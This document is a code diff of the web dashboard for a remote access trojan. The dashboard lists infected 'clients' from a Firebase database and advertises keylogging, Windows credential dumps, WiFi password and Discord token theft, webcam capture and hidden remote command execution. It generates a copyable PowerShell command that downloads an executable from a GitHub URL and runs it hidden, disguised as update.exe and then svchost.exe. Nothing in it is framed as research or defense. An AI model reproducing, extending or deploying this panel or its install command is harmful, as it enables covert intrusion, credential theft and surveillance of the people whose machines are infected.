-      <div id="buildCmdText" style="margin-top:.25rem;line-height:1.6">Invoke-WebRequest -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\update.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\update.exe"</span></div>
-      <button class="copy-btn" onclick="copyBuildCmd()">Copy</button>
+      <div id="buildCmdText" style="margin-top:.2rem">iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\svchost.exe"</span></div>
+      <button class="cp" onclick="copyBuildCmd()">Copy</button>
     </div>
   </div>
   <div class="build-panel">
     <h3>All Features</h3>
     <ul class="feature-list">
-      <li>Stealth execution · no console window</li>
-      <li>Auto-start via HKCU\Run registry</li>
-      <li>Remote CMD with real-time output</li>
+      <li>Stealth · no console window</li>
+      <li>Auto-start via registry</li>
+      <li>Remote CMD with output</li>
       <li>Multi-monitor screenshots</li>
-      <li>Live screen @ 5 FPS streaming</li>
-      <li>Remote mouse &amp; keyboard control</li>
-      <li>Full file system browsing</li>
-      <li>Webcam image capture</li>
+      <li>Live screen streaming</li>
+      <li>Remote mouse &amp; keyboard</li>
+      <li>Full file system browser</li>
+      <li>File upload, download, CRUD</li>
+      <li>File encrypt/decrypt</li>
+      <li>Webcam capture</li>
       <li>Process list &amp; kill</li>
-      <li>System info · RAM, CPU, disks</li>
+      <li>System info (CPU, RAM, disks)</li>
       <li>WiFi password extraction</li>
       <li>Windows credential dump</li>
       <li>Network info &amp; connections</li>
-      <li>Services &amp; installed apps</li>
-      <li>Shutdown, restart, lock, logoff</li>
+      <li>Windows services list</li>
+      <li>Installed applications</li>
+      <li>Discord token grabber</li>
+      <li>Keylogger (start/stop/dump)</li>
+      <li>Host info (OS, GPU, uptime)</li>
+      <li>Environment variables</li>
+      <li>Power, lock, logoff, restart</li>
       <li>MsgBox, volume, clipboard</li>
-      <li>Idle time &amp; system uptime</li>
-      <li>50ms instant command polling</li>
-      <li>Firebase Realtime Database</li>
+      <li>Idle time, uptime</li>
+      <li>50ms instant command poll</li>
+      <li>Firebase Realtime DB</li>
+      <li>Self-hosted server option</li>
+      <li>WebSocket broadcasts</li>
     </ul>
   </div>
 </div>
@@ -213,78 +236,135 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
 <script>
 const FB = location.hostname==='localhost'||location.hostname==='127.0.0.1'
   ? 'http://'+location.hostname+':3000'
-  : 'https://solix-710c0-default-rtdb.europe-west1.firebasedatabase.app';
-let latest={};
-
-load();
-setInterval(load,5000);
+  : 'https://lucaaverij-default-rtdb.europe-west1.firebasedatabase.app';
+let g_clients=[], g_filtered=[];
+load(); setInterval(load,5000);
 
 function switchPage(name,el){
- document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
- document.querySelectorAll('.pages').forEach(p=>p.classList.remove('active'));
- el.classList.add('active');
- document.getElementById('page-'+name).classList.add('active');
+  document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
+  document.querySelectorAll('.pages').forEach(p=>p.classList.remove('active'));
+  el.classList.add('active');
+  document.getElementById('page-'+name).classList.add('active');
 }
 
 async function load(){
- try{
-  const r=await fetch(FB+'/pings.json');
-  if(!r.ok)return;
-  const d=await r.json();
-  if(!d||typeof d!=='object'){document.getElementById('clientList').innerHTML='<div class="empty-state"><div class="empty-icon">⌘</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';return;}
-  const names=Object.keys(d);
-  const now=Date.now();
-  const online=names.filter(n=>{const t=d[n]&&d[n].created_at;return t&&now-new Date(t).getTime()<60000;});
-  document.getElementById('onlineCount').textContent=online.length;
-  document.getElementById('totalCount').textContent=names.length;
-  const allTs=names.map(n=>d[n]&&d[n].created_at).filter(Boolean).sort().reverse();
-  if(allTs.length)document.getElementById('lastPing').textContent=new Date(allTs[0]).toLocaleTimeString();
-  const today=new Date();today.setHours(0,0,0,0);
-  document.getElementById('activeToday').textContent=names.filter(n=>{const t=d[n]&&d[n].created_at;return t&&new Date(t).getTime()>today.getTime();}).length;
-  const list=document.getElementById('clientList');
-  list.innerHTML=names.map((n,i)=>{
-   const x=d[n];if(!x)return'';
-   const age=now-new Date(x.created_at).getTime();const isOnline=age<60000;
-   const ip=x.ip||'?';const ts=new Date(x.created_at).toLocaleString();
-   return '<div class="client-card" style="animation-delay:'+(i*0.04)+'s"><div class="dot '+(isOnline?'online':'offline')+'"></div><div class="info"><div class="name">'+esc(n)+' <span style="font-size:.7rem;color:rgba(255,255,255,.25);font-weight:400">'+esc(ip)+'</span></div><div class="meta"><span>Last: '+ts+'</span><span style="color:'+(isOnline?'#4ade80':'rgba(255,255,255,.2)')+'">'+(isOnline?'● Online':'○ Offline')+'</span></div></div><div class="actions"><button class="btn btn-ghost btn-sm" onclick="openClient(\''+escAttr(n)+'\')">Open</button><button class="btn btn-danger btn-sm" onclick="removeClient(\''+escAttr(n)+'\')">Remove</button></div></div>';
-  }).join('');
- }catch{}
+  try{
+    const r=await fetch(FB+'/pings.json');
+    if(!r.ok)return;
+    const d=await r.json();
+    if(!d||typeof d!=='object'){emptyState();return;}
+    g_clients=Object.keys(d).map(n=>{const x=d[n]||{};return{name:n,ip:x.ip||'?',ts:x.created_at,cores:x.cores||0,ram:x.ram||0,monitors:x.monitors||0,keylog:x.keylog,ver:x.version||'1.0',uptime:x.uptime||0};});
+    render();
+  }catch{}
 }
 
-function esc(t){const d=document.createElement('div');d.textContent=t;return d.innerHTML}
-function escAttr(t){return t.replace(/['"]/g,'').replace(/[^a-zA-Z0-9 _-]/g,'')}
-function openClient(name){window.open('client.html?name='+encodeURIComponent(name),'_blank');}
-function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe';}
-async function removeClient(name){
- if(!confirm('Remove '+name+' and all its data?'))return;
- try{await fetch(FB+'/pings/'+encodeURIComponent(name)+'.json',{method:'DELETE'});await fetch(FB+'/commands/'+encodeURIComponent(name)+'.json',{method:'DELETE'});await fetch(FB+'/live/'+encodeURIComponent(name)+'.json',{method:'DELETE'});await load();}catch{}
+function emptyState(){
+  document.getElementById('clientList').innerHTML='<div class="empty-state"><div class="icon">⌘</div><h3>No Clients Connected</h3><p>Download and run the client on a target machine to see it appear here.</p></div>';
+  document.getElementById('onlineCount').textContent='0';document.getElementById('totalCount').textContent='0';document.getElementById('lastPing').textContent='-';document.getElementById('activeToday').textContent='0';
+}
+
+function render(){
+  const now=Date.now();const today=new Date();today.setHours(0,0,0,0);
+  const sort=document.getElementById('sortSelect').value;
+  const online=g_clients.filter(c=>{const t=c.ts;return t&&now-new Date(t).getTime()<60000;});
+  const total=g_clients.length;
+  const allTs=g_clients.map(c=>c.ts).filter(Boolean).sort().reverse();
+  const activeToday=g_clients.filter(c=>{const t=c.ts;return t&&new Date(t).getTime()>today.getTime();}).length;
+
+  animateNum('onlineCount',online.length);
+  document.getElementById('totalCount').textContent=total;
+  if(allTs.length)document.getElementById('lastPing').textContent=new Date(allTs[0]).toLocaleTimeString();
+  document.getElementById('activeToday').textContent=activeToday;
+
+  let sorted=[...g_clients];
+  if(sort==='online')sorted.sort((a,b)=>{const oa=a.ts&&now-new Date(a.ts).getTime()<60000?1:0;const ob=b.ts&&now-new Date(b.ts).getTime()<60000?1:0;return ob-oa||a.name.localeCompare(b.name);});
+  else if(sort==='name')sorted.sort((a,b)=>a.name.localeCompare(b.name));
+  else if(sort==='recent')sorted.sort((a,b)=>(b.ts||'').localeCompare(a.ts||''));
+
+  g_filtered=sorted;
+  filterClients();
+}
+
+function animateNum(id,target){
+  const el=document.getElementById(id);const cur=parseInt(el.textContent)||0;
+  if(cur===target)return;
+  const diff=target-cur;const step=diff>0?Math.ceil(diff/15):Math.floor(diff/15);
+  let val=cur;const iv=setInterval(()=>{val+=step;if(diff>0?val>=target:val<=target){val=target;clearInterval(iv);}el.textContent=val;},30);
+}
+
+function filterClients(){
+  const q=document.getElementById('searchInput').value.toLowerCase();
+  const list=document.getElementById('clientList');
+  const filtered=g_filtered.filter(c=>c.name.toLowerCase().includes(q)||c.ip.includes(q));
+  if(!filtered.length){list.innerHTML='<div class="empty-state" style="padding:2rem"><h3>No matching clients</h3><p>Try a different search term</p></div>';return;}
+  list.innerHTML=filtered.map((c,i)=>{
+    const age=c.ts?Date.now()-new Date(c.ts).getTime():1/0;
+    const isOnline=age<60000;
+    return `<div class="client-card" style="animation-delay:${i*0.03}s">
+      <div class="dot ${isOnline?'online':'offline'}"></div>
+      <div class="info">
+        <div class="nm">${esc(c.name)} <span class="ip">${esc(c.ip)}</span></div>
+        <div class="meta">
+          ${c.ts?'<span>'+new Date(c.ts).toLocaleString()+'</span>':''}
+          <span class="tag ${isOnline?'green':'red'}">${isOnline?'● Online':'○ Offline'}</span>
+          ${c.cores?'<span><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 1v3M15 1v3M9 20v3M15 20v3M1 9h3M20 9h3M1 15h3M20 15h3"/></svg>'+c.cores+'c</span>':''}
+          ${c.ram?'<span><svg viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2"/><path d="M9 22v-4h6v4"/></svg>'+(c.ram>1024?(c.ram/1024).toFixed(1)+'GB':c.ram+'MB')+'</span>':''}
+          ${c.monitors?'<span>🖥 '+c.monitors+'</span>':''}
+          ${c.keylog?'<span class="tag green">⌨</span>':''}
+        </div>
+      </div>
+      <div class="actions">
+        <button class="btn btn-accent btn-sm" onclick="openClient('+JSON.stringify(c.name)+')">Open</button>
+        <button class="btn btn-danger btn-sm" onclick="removeClient('+JSON.stringify(c.name)+')">✕</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function esc(s){if(!s)return'';return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
+function openClient(n){window.open('client.html?name='+encodeURIComponent(n),'_blank')}
+function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe'}
+async function removeClient(n){
+  if(!confirm('Remove '+n+' and all its data?'))return;
+  try{await fetch(FB+'/pings/'+encodeURIComponent(n)+'.json',{method:'DELETE'});await fetch(FB+'/commands/'+encodeURIComponent(n)+'.json',{method:'DELETE'});await fetch(FB+'/live/'+encodeURIComponent(n)+'.json',{method:'DELETE'});toast('Removed '+n);load()}catch{}
 }
 async function removeAllClients(){
- if(!confirm('Remove ALL clients and their data? This cannot be undone.'))return;
- const el=document.getElementById('clientList');const orig=el.innerHTML;
- el.innerHTML='<div class="loading">Removing all...</div>';
- try{
-  const r=await fetch(FB+'/pings.json');
-  if(!r.ok)return;
-  const d=await r.json();
-  if(!d||typeof d!=='object')return;
-  const names=Object.keys(d);
-  for(const n of names){
-   await fetch(FB+'/pings/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
-   await fetch(FB+'/commands/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
-   await fetch(FB+'/live/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
-  }
-  await load();
- }catch{el.innerHTML=orig}
+  if(!confirm('Remove ALL clients and their data?'))return;
+  const el=document.getElementById('clientList');el.innerHTML='<div style="text-align:center;padding:2rem;color:var(--text2)">Removing all...</div>';
+  try{
+    const r=await fetch(FB+'/pings.json');if(!r.ok)return;const d=await r.json();
+    if(d&&typeof d==='object')for(const n of Object.keys(d)){
+      await fetch(FB+'/pings/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
+      await fetch(FB+'/commands/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
+      await fetch(FB+'/live/'+encodeURIComponent(n)+'.json',{method:'DELETE'});
+    }
+    toast('All clients removed');load()
+  }catch{}
 }
+function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}
+
 function buildArgs(){
- const n=document.getElementById('clientName').value.trim();const s=document.getElementById('startupToggle').checked;
- const p=document.getElementById('pingToggle').checked;const sc=document.getElementById('screenToggle').checked;const st=document.getElementById('stealthToggle').checked;
- let a='';if(n)a+=' --name "'+n+'"';if(!s)a+=' --no-startup';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';
- return a;
+  const n=document.getElementById('clientName').value.trim();
+  const s=document.getElementById('startupToggle').checked;
+  const p=document.getElementById('pingToggle').checked;
+  const sc=document.getElementById('screenToggle').checked;
+  const st=document.getElementById('stealthToggle').checked;
+  let a='';if(n)a+=' --name "'+n+'"';if(!s)a+=' --no-startup';if(!p)a+=' --no-ping';if(!sc)a+=' --no-screen';if(!st)a+=' --show';
+  return a;
 }
-function updateBuildCmd(){const a=buildArgs();document.getElementById('buildCmdText').innerHTML='Invoke-WebRequest -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\\update.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\\update.exe"</span>'+a;}
-function copyBuildCmd(){navigator.clipboard.writeText(document.getElementById('buildCmdText').textContent).then(()=>{const b=document.querySelector('.install-cmd .copy-btn');b.textContent='Copied!';setTimeout(()=>b.textContent='Copy',2000);});}
+function updateBuildCmd(){
+  const a=buildArgs();
+  document.getElementById('buildCmdText').innerHTML='iwr -Uri <span class="str">"https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe"</span> -OutFile <span class="cmd">"$env:TEMP\\svchost.exe"</span>; Start-Process -WindowStyle Hidden <span class="cmd">"$env:TEMP\\svchost.exe"</span>'+esc(a);
+}
+function copyBuildCmd(){
+  const t=document.getElementById('buildCmdText').textContent;
+  navigator.clipboard.writeText(t).then(()=>{document.querySelector('.install-cmd .cp').textContent='Copied!';setTimeout(()=>document.querySelector('.install-cmd .cp').textContent='Copy',2000);toast('Command copied')});
+}
+
+// Keyboard shortcuts
+document.addEventListener('keydown',e=>{
+  if(e.ctrlKey&&e.key==='r'){e.preventDefault();load()}
+});
 </script>
 </body>
 </html>
